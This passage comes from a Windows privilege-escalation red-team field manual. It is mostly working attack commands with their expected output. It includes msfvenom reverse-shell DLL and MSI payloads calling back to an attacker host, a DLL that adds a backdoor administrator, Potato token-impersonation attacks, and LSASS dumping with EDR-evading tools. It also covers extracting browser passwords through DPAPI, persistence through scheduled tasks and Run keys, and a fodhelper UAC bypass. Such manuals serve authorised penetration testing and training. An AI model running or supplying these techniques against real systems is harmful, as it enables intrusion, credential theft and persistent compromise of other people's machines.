msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f dll -o missing.dll
# Or: add user:
msfvenom -p windows/x64/exec CMD='net user hacker Password123! /add && net localgroup administrators hacker /add' -f dll -o missing.dll

# Custom DLL with DllMain (cleaner):
cat > /tmp/dll.c << 'EOF'
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            system("cmd /c net user hacker Password123! /add");
            system("cmd /c net localgroup administrators hacker /add");
            break;
    }
    return TRUE;
}
EOF
x86_64-w64-mingw32-gcc -shared -o missing.dll /tmp/dll.c -lws2_32

# Place DLL in writable path location:
copy missing.dll "C:\Python39\missing.dll"
# Restart the service → DLL loads → command executes as SYSTEM!
```

---

# PART 4 — REGISTRY ATTACKS

---

## 12. AlwaysInstallElevated — MSI as SYSTEM

### Layman's Terms
Windows has a policy called **AlwaysInstallElevated** that, when enabled, allows ANY user to install MSI packages with elevated (SYSTEM) privileges. If both the machine-level AND user-level registry keys are set to 1, **any MSI file we create runs as SYSTEM**. This is a direct path from any user to SYSTEM.

```cmd
:: CHECK IF VULNERABLE (both keys must be 1):
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: Expected VULNERABLE output:
:: HKEY_CURRENT_USER\...\Installer
::     AlwaysInstallElevated    REG_DWORD    0x1

:: HKEY_LOCAL_MACHINE\...\Installer
::     AlwaysInstallElevated    REG_DWORD    0x1

:: BOTH must be 0x1 — if either is 0 or missing, not vulnerable
```

```powershell
# PowerShell check:
$HKCU = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
$HKLM = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($HKCU -eq 1 -and $HKLM -eq 1) { Write-Host "VULNERABLE!" -ForegroundColor Red }

# EXPLOITATION:
# Generate MSI payload on Kali:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.50 LPORT=4444 \
  -f msi -o shell.msi
# Start listener: nc -lvnp 4444

# On target — install the MSI (runs as SYSTEM!):
msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
# /quiet = no user interaction
# /qn = no GUI
# /i = install

# Expected: SYSTEM reverse shell arrives!

# Using PowerUp:
Write-UserAddMSI
# Creates a MSI that adds localadmin:Password123!
msiexec /quiet /qn /i UserAdd.msi
net localgroup administrators
# localadmin is now in admins!

# Alternative MSI payload generator:
# On Kali with Metasploit:
# use exploit/windows/local/always_install_elevated
# set SESSION meterpreter_session_id
# run
```

---

## 13. Registry Autorun Key Hijacking

```cmd
:: Check all autorun locations:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
:: Also check:
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path
```

```powershell
# Check if we can write to autorun key locations:
$autoruns = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$autoruns.PSObject.Properties | ForEach-Object {
    $binPath = $_.Value -split '"' | Select-Object -Index 1
    if (-not $binPath) { $binPath = $_.Value -split ' ' | Select-Object -First 1 }
    $acl = Get-Acl $binPath -ErrorAction SilentlyContinue
    if ($acl.AccessToString -match "Everyone.*Allow.*Write|Users.*Allow.*Write") {
        Write-Host "HIJACKABLE AUTORUN: $($_.Name) -> $binPath" -ForegroundColor Red
    }
}

# If we CAN write the autorun key itself (registry key is writable):
# Add our payload to run at next login:
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
# Next time ANY user logs in → shell.exe runs as that user

# For SYSTEM context — requires writable HKLM Run key (less common):
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
# Runs as the user who logs in → if admin logs in → admin shell
```

---

## 14. Credentials in Registry

```cmd
:: ── AUTOLOGON CREDENTIALS ─────────────────────────────────────────
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
:: Expected JACKPOT:
:: DefaultUserName     REG_SZ    Administrator
:: DefaultPassword     REG_SZ    SuperSecretPassword123!   ← CLEARTEXT ADMIN PASSWORD!
:: AutoAdminLogon      REG_SZ    1

:: ── VNC CREDENTIALS ───────────────────────────────────────────────
reg query HKCU\Software\ORL\WinVNC3\Password 2>nul
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password 2>nul
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /v CommunityString 2>nul

:: ── PUTTY SSH HOST KEYS (contains hosts users connect to) ─────────
reg query HKCU\Software\SimonTatham\PuTTY\Sessions\ 2>nul
:: May contain stored credentials or host information

:: ── MREMOTENG (credentials manager) ────────────────────────────────
:: mRemoteNG stores connection profiles with credentials
type %APPDATA%\mRemoteNG\confCons.xml 2>nul
:: Passwords are AES encrypted but with a default key!
:: Tool: mremoteng-decrypt (GitHub)

:: ── WINDOWS CREDENTIAL MANAGER ─────────────────────────────────────
cmdkey /list
:: Expected:
:: Target: Domain:target=TERMSRV/fileserver.corp.local
:: Type: Domain Password
:: User: CORP\carol
:: This means carol's credentials are saved for RDP to fileserver!
:: Can be used with runas /savedcred or extracted with mimikatz
```

---

## 15. Stored AutoLogon Credentials

```cmd
:: This is EXTREMELY COMMON in enterprise environments
:: Help desks, kiosk machines, servers with autologon configured

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword AutoAdminLogon"

:: If DefaultPassword is present:
:: 1. Try it for local admin account
runas /user:Administrator cmd
:: Enter: the DefaultPassword value

:: 2. Try it for domain account (if domain-joined):
runas /user:CORP\Administrator cmd

:: 3. Pass it to other machines (password reuse):
:: From Kali:
evil-winrm -i 10.10.10.100 -u Administrator -p "SuperSecretPassword123!"
impacket-psexec Administrator:'SuperSecretPassword123!'@10.10.10.100

:: Also check LSA secrets (requires SYSTEM or Mimikatz):
:: Mimikatz: lsadump::secrets
:: These often contain autologon passwords too
```

---

# PART 5 — TOKEN & PRIVILEGE ABUSE

---

## 16. Windows Privileges — The Complete Map

### Layman's Terms
Windows token privileges are **special permissions** beyond normal file ACLs. They're attached to your access token and control what system operations you can perform. Some sound harmless but lead directly to SYSTEM. The key principle: **any privilege that lets you interact with a process or file as another user = escalation path**.

```
PRIVILEGE MAP — IMPACT LEVEL:

INSTANT SYSTEM (use immediately):
  SeImpersonatePrivilege  → Potato attacks (GodPotato, PrintSpoofer etc.)
  SeAssignPrimaryTokenPrivilege → Same as impersonate

HIGH IMPACT:
  SeDebugPrivilege        → Dump LSASS, inject into SYSTEM processes
  SeBackupPrivilege       → Read any file (bypass ACLs) → read SAM/NTDS
  SeRestorePrivilege      → Write any file → plant backdoors, replace binaries
  SeLoadDriverPrivilege   → Load kernel driver → BYOVD → SYSTEM
  SeTakeOwnershipPrivilege → Take ownership of any object → then modify
  SeManageVolumePrivilege → Access raw disk volumes → read SAM offline

MEDIUM IMPACT:
  SeCreateTokenPrivilege  → Create arbitrary tokens → become anyone
  SeTcbPrivilege          → Act as part of OS
  SeEnableDelegationPrivilege → AD Kerberos delegation

LOW IMPACT (useful but not direct privesc):
  SeShutdownPrivilege     → Can restart machine (triggers autoruns)
  SeChangeNotifyPrivilege → Normal user right
  SeNetworkLogonRight     → Remote logon
```

```cmd
:: Check your current privileges:
whoami /priv

:: Expected dangerous output:
:: SeImpersonatePrivilege        Impersonate a client after authentication  Enabled
:: SeDebugPrivilege              Debug programs                             Enabled
:: SeBackupPrivilege             Back up files and directories              Disabled

:: NOTE: "Disabled" doesn't mean you can't use it!
:: Disabled = not currently active in token, but ASSIGNABLE
:: Many tools enable privileges programmatically before using them
:: PowerShell: [System.Diagnostics.Process]::GetCurrentProcess().Privileges

:: When do you get these privileges?
:: Service accounts (IIS, MSSQL, Print Spooler): SeImpersonatePrivilege
:: Backup software service accounts: SeBackupPrivilege + SeRestorePrivilege
:: Local admins: SeDebugPrivilege (if UAC-elevated or SYSTEM shell)
```

---

## 17. SeImpersonatePrivilege — Potato Family

### Layman's Terms
`SeImpersonatePrivilege` means **you can impersonate another user after they authenticate to you**. The Potato attacks force the SYSTEM account to authenticate to a fake server you control — you then impersonate that SYSTEM token. Service accounts always have this privilege. **This is the single most common PrivEsc path on Windows**.

### Real-World Context
Service accounts — the accounts running IIS, MSSQL, various Windows services — are given `SeImpersonatePrivilege` by design so they can impersonate connecting clients. If you get a shell as `NT AUTHORITY\NETWORK SERVICE`, `IIS APPPOOL\DefaultAppPool`, or any service account, check for this privilege first. It's almost always there and almost always exploitable.

```cmd
:: Check:
whoami /priv | findstr /I "impersonate"
:: Expected:
:: SeImpersonatePrivilege  Impersonate a client after authentication  Enabled

:: ── GODPOTATO (most modern, works on Server 2019, 2022, Win10/11) ────
:: Download: https://github.com/BeichenDream/GodPotato/releases
GodPotato.exe -cmd "cmd /c whoami"
:: Expected: nt authority\system

:: Reverse shell via GodPotato:
GodPotato.exe -cmd "cmd /c C:\Windows\Temp\shell.exe"
:: shell.exe = your netcat or msfvenom payload

:: Add local admin:
GodPotato.exe -cmd "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"

:: ── PRINTSPOOFER (Windows 10, Server 2019) ───────────────────────
:: Download: https://github.com/itm4n/PrintSpoofer/releases
PrintSpoofer.exe -i -c cmd
:: Expected: Windows PowerShell / cmd running as NT AUTHORITY\SYSTEM
PrintSpoofer.exe -c "C:\Windows\Temp\shell.exe"
PrintSpoofer.exe -i -c "powershell.exe"

:: ── SWEETPOTATO (various Windows versions) ───────────────────────
SweetPotato.exe -a "net user hacker Password123! /add"
SweetPotato.exe -a "net localgroup administrators hacker /add"
SweetPotato.exe -p shell.exe   :: Execute payload

:: ── JUICYPOTATO (Windows Server 2016, 2019 — older) ─────────────
:: Requires finding a valid CLSID for the target OS:
:: CLSIDs by OS: https://github.com/ohpe/juicy-potato/tree/master/CLSID
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"

:: ── ROGUEPOTATO (specifically for remote/constrained sessions) ────
RoguePotato.exe -r 10.10.10.50 -e "cmd.exe /c whoami" -l 9999
:: -r = attacker IP (for OXID resolver)

:: ── METERPRETER (if you have a session) ─────────────────────────
:: meterpreter> use incognito
:: meterpreter> list_tokens -u
:: meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"
:: Meterpreter's getsystem uses a named pipe trick (similar to Potato):
:: meterpreter> getsystem

:: ── WHICH POTATO TO USE WHEN? ─────────────────────────────────────
:: Windows Server 2022 / Windows 11: GodPotato
:: Windows Server 2019 / Windows 10: GodPotato, PrintSpoofer
:: Windows Server 2016: JuicyPotato, SweetPotato
:: Windows Server 2012: JuicyPotato, Rotten Potato
:: ALL: If in doubt, try GodPotato first — broadest compatibility
```

---

## 18. SeDebugPrivilege

```powershell
# SeDebugPrivilege allows attaching to ANY process regardless of ACL
# = Dump LSASS, inject into SYSTEM processes

# WHO has this:
# Local Admins (when running elevated) → most common source
# Some custom service accounts

# CHECK:
whoami /priv | findstr "Debug"
# Expected: SeDebugPrivilege  Debug programs  Enabled

# EXPLOIT 1: Dump LSASS (credentials):
# With Mimikatz:
privilege::debug
sekurlsa::logonpasswords

# Without Mimikatz — using ProcDump:
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Transfer dump to Kali, analyze with pypykatz

# EXPLOIT 2: Inject into SYSTEM process:
# Find a SYSTEM process:
Get-Process -IncludeUserName | Where-Object {$_.UserName -eq "NT AUTHORITY\SYSTEM"} | Select-Object Id, ProcessName | Sort-Object ProcessName | Select-Object -First 10

# Inject via Meterpreter:
# meterpreter> migrate SYSTEM_PID
# After migration: you're running as SYSTEM!
```

---

## 19. SeBackupPrivilege

```powershell
# SeBackupPrivilege: bypass ACLs for READ operations
# You can read ANY file, regardless of permissions
# = Read SAM, SYSTEM, NTDS.dit, any protected file

# CHECK:
whoami /priv | findstr "Backup"

# WHO has this: Backup operators, some service accounts

# EXPLOIT: Read SAM and SYSTEM (local hashes):
# Using diskshadow + robocopy (standard Windows tools):
# Step 1: Create shadow copy of C:
$shadowOutput = (diskshadow /s /w "set verbose on`nadd volume C: alias shadow`ncreate`nexec cmd /c echo %shadow%`n")
# Step 2: Copy files using backup semantics:
robocopy /b "\\\\.\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config" C:\Temp sam system security
# /b = backup mode (uses SeBackupPrivilege to bypass ACLs)

# Transfer to Kali and crack:
impacket-secretsdump -sam sam -system system -security security LOCAL

# SIMPLER METHOD using PowerShell and SeBackupPrivilege:
# Tool: https://github.com/giuliano108/SeBackupPrivilege
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\Temp\SAM
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# If domain controller — copy NTDS.dit (ALL domain hashes!):
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
# This only works if we're on a DC
# Extract from Kali:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

---

# PART 6 — CREDENTIAL ATTACKS

---

## 23. Windows Credential Locations — Complete Map

```
WINDOWS CREDENTIAL STORAGE MAP:

IN MEMORY (LSASS process):
  ├── NT Hashes (from interactive logins)
  ├── Cleartext passwords (WDigest — older/misconfigured)
  ├── Kerberos TGTs and service tickets
  └── NTLM challenge/response
  → Extract with: Mimikatz sekurlsa::logonpasswords

IN REGISTRY:
  ├── SAM hive: local account NT hashes
  │     HKLM\SAM → C:\Windows\System32\config\SAM
  ├── LSA Secrets: service account passwords, autologon, domain trust
  │     HKLM\SECURITY → C:\Windows\System32\config\SECURITY
  └── AutoLogon: cleartext admin password
        HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
  → Extract with: reg save, Mimikatz lsadump::sam, lsadump::secrets

ON DISK:
  ├── SAM file backup: C:\Windows\Repair\SAM (old)
  ├── Windows.old: C:\Windows.old\Windows\System32\config\SAM
  ├── NTDS.dit: C:\Windows\NTDS\ntds.dit (DC only — ALL domain hashes)
  ├── Unattend.xml: C:\Windows\Panther\Unattend.xml (deployment passwords)
  ├── web.config: C:\inetpub\wwwroot\web.config (IIS app credentials)
  ├── .config files: various application configs
  ├── PowerShell history: C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  └── Credential files: C:\Users\user\AppData\Local\Microsoft\Credentials\*

WINDOWS VAULT (Credential Manager):
  ├── Windows credentials (network, domain)
  ├── Certificate-based credentials
  └── Generic credentials (stored app passwords)
  → List with: cmdkey /list
  → Extract with: Mimikatz vault::cred, vault::list

DPAPI (Data Protection API):
  ├── Browser saved passwords
  ├── BitLocker keys
  ├── WiFi passwords
  └── RDP saved credentials
  → Extract with: Mimikatz dpapi::*, SharpDPAPI
```

---

## 24. SAM & SYSTEM — Local Hash Extraction

```cmd
:: ── METHOD 1: Registry save (requires local admin) ───────────────
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
:: Transfer to Kali:
:: impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
:: Expected:
:: Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
:: bob:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

:: ── METHOD 2: Volume Shadow Copy (bypass file locks) ─────────────
wmic shadowcopy call create volume='C:\'
:: Note the ShadowID from output
vssadmin list shadows | findstr "Shadow Copy Volume"
:: Expected: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

:: Copy from shadow:
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\Temp\SAM
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Temp\SYSTEM

:: ── METHOD 3: Mimikatz ───────────────────────────────────────────
:: (requires SYSTEM or debug privilege)
:: privilege::debug
:: lsadump::sam
:: Expected:
:: Domain : WS01
:: SysKey : abc123...
:: RID: 000001f4 (500) User: Administrator
:: NTLM: 8846f7eaee8fb117ad06bdd830b7586c

:: ── METHOD 4: CrackMapExec (from Kali, requires admin) ───────────
:: crackmapexec smb 10.10.10.100 -u administrator -p Password1! --sam
```

---

## 25. LSASS Credential Extraction (All Methods)

> **Reference:** Full LSASS dumping methods covered in `Linux_PrivEsc_PostExploitation_RedTeam_Field_Manual.md` Section 22 and `Active_Directory_RedTeam_Field_Manual.md` Section 22. Windows-specific methods here:

```powershell
# METHOD 1: Task Manager (GUI — most basic):
# Task Manager → Details → lsass.exe → Right-click → Create dump file
# Saved to: C:\Users\user\AppData\Local\Temp\lsass.DMP

# METHOD 2: Mimikatz (direct — triggers most AV):
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# Often flagged — use obfuscated versions or load from memory

# METHOD 3: ProcDump (Microsoft signed — often bypasses AV):
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Expected: [?] Dump 1 initiated...
# Transfer dump to Kali: pypykatz lsa minidump lsass.dmp

# METHOD 4: comsvcs.dll (LOLBin — no extra tools):
# Get LSASS PID:
Get-Process lsass | Select-Object Id
# $pid = 668
tasklist | findstr lsass
# Dump:
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID C:\Windows\Temp\lsass.dmp full
# Requires SYSTEM privilege (not just admin)

# METHOD 5: ProcExp (Sysinternals) — interactive GUI

# METHOD 6: Nanodump (EDR-evasive):
# https://github.com/helpsystems/nanodump
.\nanodump.exe --write C:\Windows\Temp\lsass.dmp
# Uses direct syscalls to bypass API hooks
# Bypasses many EDR solutions

# METHOD 7: Lsassy (remote, no file on disk):
# From Kali: lsassy -d corp.local -u bob -p Password1! 10.10.10.100
# Or: crackmapexec smb 10.10.10.100 -u bob -p Password1! -M lsassy

# ANALYZE DUMP ON KALI:
pypykatz lsa minidump lsass.dmp 2>/dev/null | grep -A5 "== MSV =="
# Expected:
# == MSV ==
# Username: carol
# Domain:   CORP
# NT:       2b576acbe6bcfda7294d6bd18041b8fe   ← NT hash for PtH!
# SHA1:     abc123...
```

---

## 26. DPAPI — Windows Secret Vault

### Layman's Terms
DPAPI (Data Protection API) is Windows's **built-in encryption system for user secrets**. Browsers, credential manager, email clients, WiFi passwords — all encrypted with DPAPI. The encryption key is derived from the user's password. **As an attacker with the user's credentials or as SYSTEM, you can decrypt everything DPAPI protects**.

```powershell
# DPAPI protects:
# - Chrome/Edge/Brave saved passwords (LoginData file)
# - IE/Edge legacy passwords
# - Windows Credential Manager entries
# - Outlook email passwords
# - WiFi passwords (partially)
# - BitLocker recovery keys
# - SSH private keys (stored via ssh-agent)
# - RDP saved credentials

# TOOL: SharpDPAPI (best for DPAPI)
# Download: https://github.com/GhostPack/SharpDPAPI/releases

# ── DECRYPT AS CURRENT USER (their own DPAPI) ─────────────────────
# Credentials encrypted with current user's master key:
.\SharpDPAPI.exe credentials
# Expected:
# [*] Action: DPAPI Credential Triage
# Folder: C:\Users\bob\AppData\Local\Microsoft\Credentials\
#   CredFile : DFBE70A7E5CC19A398EBF1B96859CE5D
#   Description: Domain Password
#   MasterKey : abc123def456...
#   UserName  : CORP\alice
#   Credential: SecretPassword123!   ← DECRYPTED CREDENTIAL!

# Decrypt Chrome passwords:
.\SharpDPAPI.exe logins
# Expected:
# URL:      https://internal-app.corp.local
# Username: admin
# Password: AdminPass2024!

# ── DECRYPT AS SYSTEM (decrypt ANY user's DPAPI) ──────────────────
# System backup key decrypts all user master keys!
# Extract backup key (requires DA in domain or SYSTEM on DC):
.\SharpDPAPI.exe backupkey /server:dc01.corp.local /file:backupkey.pvk

# Now decrypt any user's DPAPI blobs with the domain backup key:
.\SharpDPAPI.exe credentials /pvk:backupkey.pvk
.\SharpDPAPI.exe logins /pvk:backupkey.pvk   # All Chrome passwords!
.\SharpDPAPI.exe vaults /pvk:backupkey.pvk   # Windows Vault credentials

# Mimikatz DPAPI decryption:
# Must impersonate target user first:
sekurlsa::dpapi
# Lists all cached DPAPI master keys in LSASS
dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

## 27. Credential Manager & Windows Vault

```cmd
:: List all saved credentials:
cmdkey /list
:: Expected:
:: Target: Domain:target=TERMSRV/fileserver.corp.local
:: Type: Domain Password
:: User: CORP\carol
::
:: Target: MicrosoftOffice16_Data:SSPI:user@domain.com
:: Type: Generic
:: User: user@domain.com

:: Use saved credential for runas:
runas /savecred /user:CORP\carol cmd
:: /savecred = use stored credential without prompting for password!
:: If carol's credentials are saved → get her shell without knowing password!

:: Use saved RDP credential:
mstsc /v:fileserver.corp.local
:: Will use saved credential automatically

:: Extract via Mimikatz:
vault::list   :: List vault entries
vault::cred   :: Dump credential values

:: SharpDPAPI:
.\SharpDPAPI.exe vaults
```

---

## 28. Browser Credentials on Windows

```powershell
# ── CHROME / EDGE / BRAVE ─────────────────────────────────────────
# Databases are in:
# Chrome: C:\Users\USER\AppData\Local\Google\Chrome\User Data\Default\Login Data
# Edge:   C:\Users\USER\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
# Brave:  C:\Users\USER\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data

# These SQLite files contain DPAPI-encrypted passwords.
# Must decrypt with user's DPAPI key.

# ── LAZERCHROME — chrome credential extractor ─────────────────────
# From Kali (if you have admin and can reach the file):
python3 lazychrome.py C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data

# ── SHARPCHROME ───────────────────────────────────────────────────
.\SharpChrome.exe logins
# Expected:
# [*] Action: Chrome Saved Logins Triage
# file         : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data
# URL          : https://10.10.10.10/admin
# Username     : admin
# Password     : P@ssw0rd!   ← Decrypted!

# ── MOZZILLA FIREFOX ─────────────────────────────────────────────
# Database: C:\Users\USER\AppData\Roaming\Mozilla\Firefox\Profiles\PROFILE\logins.json
# Key database: key4.db in same directory
# Encrypted with NSS (Network Security Services)

# From Kali:
python3 firefox_decrypt.py "C:\Users\bob\AppData\Roaming\Mozilla\Firefox\Profiles\abc.default-release"
# Expected:
# Website:   https://corp-intranet.local
# Username:  bob
# Password:  Password1!
```

---

## 29. Searching for Credentials in Files

```cmd
:: ── POWERSHELL HISTORY (massive source of credentials) ────────────
type C:\Users\bob\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
:: Expected:
:: Invoke-WebRequest -Uri http://server -Credential (Get-Credential admin)
:: net use \\fileserver /user:corp\admin Password123!
:: mysql -u root -pSuperSecret

:: ── GREP FOR PASSWORDS IN COMMON LOCATIONS ────────────────────────
:: findstr /si = search In subdirs, case Insensitive
findstr /si "password" C:\Users\*.txt 2>nul
findstr /si "password" C:\Users\*.xml 2>nul
findstr /si "password" C:\Users\*.ini 2>nul
findstr /si "password" C:\Users\*.config 2>nul

:: Web application configs:
findstr /si "password connectionstring datasource" C:\inetpub\*.config 2>nul
findstr /si "password" C:\inetpub\wwwroot\*.xml 2>nul

:: IIS and web configs:
type C:\inetpub\wwwroot\web.config 2>nul | findstr /I "password connectionstring"

:: ── STICKY NOTES (Windows 10) ─────────────────────────────────────
:: Sticky Notes stores data in SQLite:
type %LOCALAPPDATA%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite 2>nul

:: ── TEAMS, SLACK, OTHER APPS ──────────────────────────────────────
:: Microsoft Teams stores tokens:
type %APPDATA%\Microsoft\Teams\storage.json 2>nul | findstr /I "token auth"
:: Slack stores tokens:
type %APPDATA%\Slack\storage\slack-workspaces 2>nul

:: ── POWERSHELL SCRIPTS ON DISK ────────────────────────────────────
findstr /si "password credential secret" C:\*.ps1 2>nul
findstr /si "password credential secret" C:\Scripts\*.ps1 2>nul
dir /s /b C:\ 2>nul | findstr /I "\.ps1$" | head

:: ── GIT REPOSITORIES ──────────────────────────────────────────────
:: Find .git directories (often on developer machines):
dir /s /a:d .git C:\ 2>nul | findstr ".git"
:: If found, check for secrets:
cd C:\repos\app
git log --oneline | head
git show HEAD:config.php
git grep "password\|secret\|key"
```

---

# PART 7 — SCHEDULED TASKS & STARTUP

---

## 30. Scheduled Task Abuse

```cmd
:: ── ENUMERATE SCHEDULED TASKS ────────────────────────────────────
schtasks /query /fo LIST /v
:: Look for:
:: - Tasks running as SYSTEM with writable paths
:: - Tasks with loose file permissions
:: - Tasks running scripts in writable locations

:: PowerShell version (more readable):
Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq "Highest"} | 
  Select-Object TaskName, TaskPath, @{n='Action';e={$_.Actions.Execute}}

:: ── FIND WRITABLE TASK EXECUTABLES ───────────────────────────────
$tasks = Get-ScheduledTask
foreach ($task in $tasks) {
    foreach ($action in $task.Actions) {
        if ($action.Execute) {
            $exe = $action.Execute.Trim('"')
            if (Test-Path $exe) {
                $acl = Get-Acl $exe -ErrorAction SilentlyContinue
                if ($acl.AccessToString -match "Everyone.*Write|Users.*Write|Authenticated Users.*Write") {
                    Write-Host "HIJACKABLE TASK BINARY: $($task.TaskName) -> $exe" -ForegroundColor Red
                }
            }
        }
    }
}

:: ── EXPLOIT WRITABLE TASK BINARY ─────────────────────────────────
:: Backup original:
copy "C:\Tasks\cleanup.exe" "C:\Tasks\cleanup.exe.bak"
:: Replace with payload:
copy C:\Windows\Temp\shell.exe "C:\Tasks\cleanup.exe"
:: Wait for task to run, or force execution:
schtasks /run /tn "CleanupTask"
:: Expected: SYSTEM reverse shell!

:: ── CREATE MALICIOUS SCHEDULED TASK (if you have admin) ──────────
:: Persistence as SYSTEM:
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM /f
:: Runs at every logon as SYSTEM
schtasks /run /tn "WindowsUpdate"  :: Trigger immediately
```

---

# PART 8 — UAC BYPASS

---

## 32. UAC — What It Is and Why It Matters

### Layman's Terms
UAC (User Account Control) is the Windows prompt that appears when an admin needs to do something privileged. Even if you're logged in as a local admin, you're running with limited token by default — UAC prevents automatic elevation. **UAC bypass means elevating to high-integrity (full admin) without triggering the prompt**.

```
UAC INTEGRITY LEVELS:
  System    → NT AUTHORITY\SYSTEM — highest
  High      → Administrator (after UAC elevation) — full admin
  Medium    → Standard user / admin before elevation
  Low       → Sandboxed processes (browser renderer, etc.)
  
YOU ARE HERE (after low-priv exploit):
  cmd.exe runs at Medium integrity
  Even if your user IS local admin, you're still medium integrity
  Can't: write to C:\Windows\, modify services, dump LSASS, etc.
  
UAC BYPASS GOAL:
  Get a high-integrity process without triggering the UAC prompt
  = Go from medium integrity to high integrity silently
  
UAC SETTINGS (registry):
  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
  ConsentPromptBehaviorAdmin:
    0 = Elevate silently (UAC effectively disabled — bypass trivial)
    1 = Prompt for credentials (full UAC)
    2 = Prompt for consent (default — most common)
    5 = Prompt for consent for non-Windows binaries
```

---

## 33. UAC Bypass Techniques

```powershell
# FIRST: Check UAC status and your current integrity:
# Check integrity level:
whoami /groups | findstr "Mandatory Label"
# Expected:
# Mandatory Label\Medium Mandatory Level   ← Medium = need UAC bypass
# Mandatory Label\High Mandatory Level     ← High = already elevated!
# Mandatory Label\System Mandatory Level   ← SYSTEM = don't need bypass

# Check UAC setting:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = disabled → PowerShell as admin = instant high integrity, no bypass needed
# 2 = default → need bypass

# ── BYPASS 1: fodhelper.exe (Windows 10, very reliable) ──────────
# fodhelper.exe is auto-elevated (doesn't trigger UAC prompt)
# It reads a registry key under HKCU before launching
# We control HKCU → we control what it runs

New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
  -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
  -Name "(default)" -Value "C:\Windows\Temp\shell.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
# Expected: shell.exe runs at HIGH integrity = FULL admin!

# ── BYPASS 2: computerdefaults.exe (similar to fodhelper) ─────────
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
  -Name "DelegateExecute" -Value "" -Force
